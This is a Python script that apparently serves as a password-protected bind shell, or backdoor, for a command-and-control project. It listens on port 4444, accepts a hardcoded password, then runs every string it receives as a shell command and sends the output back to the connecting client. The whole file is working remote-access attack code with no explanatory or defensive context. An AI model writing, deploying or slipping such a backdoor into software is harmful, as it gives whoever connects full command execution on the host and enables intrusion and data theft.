import socket
import subprocess

HOST = ''
PORT = 4444
PASSWORD = "mt_c2_project"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))


def login():
    print('Server Started')
    print('Listening for Client Connection...')
    server.listen(1)

    global client, client_addr
    client, client_addr = server.accept()
    print('Connection established from', client_addr)

    try:
        password = client.recv(1024).strip()

        if len(password) == 0:
            print('Failed Login')
            client.close()
            return False

        print('Password attempt:', password)

        if password == PASSWORD:
            print('Login Success')
            return True
        else:
            print('Failed Login')
            client.close()
            return False

    except Exception as e:
        print('Login Exception:', e)
        client.close()
        return False


login_status = False
while not login_status:
    login_status = login()


while True:
    try:
        print('Awaiting Command')

        command = client.recv(1024).strip()

        if not command:
            raise Exception("Client disconnected")

        if command == 'exit':
            client.close()
            break

        op = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        output, error = op.communicate()

        result = output + error

        if len(result) == 0:
            client.send('no stdout')
        else:
            client.send(result)

    except Exception as e:
        print('Main Loop Exception:', e)

        login_status = False
        while not login_status:
            login_status = login()

server.close()
print('Connection Closed')